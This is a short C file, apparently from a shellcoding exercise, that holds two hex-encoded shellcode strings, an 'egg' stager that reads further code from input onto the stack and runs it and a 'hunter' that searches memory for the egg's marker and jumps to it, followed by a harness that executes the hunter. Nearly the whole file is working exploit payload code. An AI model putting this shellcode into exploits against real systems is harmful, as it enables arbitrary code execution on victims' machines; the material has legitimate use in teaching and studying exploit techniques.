/*
Author:	  evoche
License:  GPL
*/

#include<stdio.h>
#include<string.h>

unsigned char egg[] = "\x90\xfd\xfc\x90\x90\xfd\xfc\x90\x6A\x7F\x5A\x54\x59\x31\xDB\x6A\x03\x58\xCD\x80\x51\xC3";    

unsigned char hunter[] = "\xeb\x15\x58\x48\x81\x38\x90\xfd\xfc\x90\x75\xf7\x81\x78\xfc\x90\xfd\xfc\x90\x75\xee\xff\xe0\xe8\xe6\xff\xff\xff";

main() 
{
	printf("Egg Shellocde Length:  %d\n", strlen(egg));
	printf("Hunter Shellocde Length:  %d\n", strlen(hunter));
	int (*ret)() = (int(*)())hunter;
	ret();
}


	
